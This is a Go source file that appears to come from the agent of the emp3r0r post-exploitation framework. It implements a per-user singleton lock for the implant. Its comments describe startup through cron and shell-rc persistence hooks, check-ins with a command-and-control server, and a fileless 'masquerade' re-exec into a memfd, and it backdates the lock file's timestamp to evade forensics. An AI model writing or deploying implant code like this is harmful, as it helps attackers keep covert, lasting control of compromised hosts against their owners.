//go:build linux
// +build linux

package agentutils

import (
	"os"
	"path/filepath"
	"syscall"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// singletonLockFD is kept open for the process lifetime (and across the
// masquerade execve); the flock is released when the process dies.
var singletonLockFD int = -1

// AcquireSingleton ensures only one agent instance runs per host user.
//
// Persistence hooks (cron @reboot, shell rc) can each start an instance,
// and multiple instances would each mint a DIFFERENT per-host UUID before
// any cache write lands — one host ends up with several identities, all
// pinned separately on the CC (observed 2026-09-22: three sessions from
// three SSH logins). The lock is taken before identity derivation, so the
// first process wins and later ones exit quietly — exactly what a real
// single-instance daemon (e.g. a local LLM server) does.
func AcquireSingleton() bool {
	if keyPersistDisabled() {
		return true // test binaries must not interfere with each other
	}
	path, err := keyCachePath()
	if err != nil {
		return true // no cache path — can't lock, let it run
	}
	lockPath := path + ".lock"
	if err := os.MkdirAll(filepath.Dir(lockPath), 0o755); err != nil {
		return true
	}
	// syscall.Open (NOT os.OpenFile — that forces O_CLOEXEC): the lock must
	// survive MasqueradeSelf's execve into the memfd, otherwise the
	// post-masquerade process runs unlocked and every persistence hook
	// spawns another instance.
	fd, err := syscall.Open(lockPath, syscall.O_RDWR|syscall.O_CREAT, 0o600)
	if err != nil {
		return true
	}
	if err := syscall.Flock(fd, syscall.LOCK_EX|syscall.LOCK_NB); err != nil {
		syscall.Close(fd)
		return false // another instance holds the lock
	}
	util.BackdateFile(lockPath, 20, 180)
	// keep the fd open for the process lifetime — it crosses the masquerade
	// execve, so the real (memfd) process keeps holding the lock
	singletonLockFD = fd
	return true
}
